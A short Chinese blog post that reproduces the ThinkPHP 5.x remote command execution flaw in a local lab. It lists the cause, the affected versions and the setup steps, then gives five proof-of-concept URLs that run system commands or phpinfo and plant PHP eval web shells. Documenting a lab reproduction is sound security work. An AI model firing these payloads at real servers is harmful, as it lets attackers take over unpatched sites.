# 原创
：  ThinkPHP5.x-远程命令执行漏洞

# ThinkPHP5.x-远程命令执行漏洞

#### ThinkPHP 5.x远程命令执行漏洞

## 漏洞原因

> 
由于框架对控制器名没有进行足够的检测，导致在没有开启强制路由(默认未开启)的情况下可能导致远程代码执行


## 漏洞影响版本

> 
Thinkphp 5.x-Thinkphp 5.1.31<br/> Thinkphp 5.0.x&lt;=5.0.23


## 漏洞复现

### 搭建漏洞环境

> 
官网下载Thinkphp 5.0.22，[下载地址](http://www.thinkphp.cn/donate/download/id/1260.html)<br/> 使用phpstudy搭建环境，解压下载的Thinkphp5.0.22到网站目录下，浏览器访问即可


### POC1

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami

```

### POC2&amp;POC3

```
http://localhost:9091/public/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1

```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1

```

### POC4&amp;POC5

```
http://localhost:9091/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_POST[cmd]);?^%3E%20%3Eshell.php

```

```
http://localhost:9091/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php @eval($_POST[test]);?&gt;

```
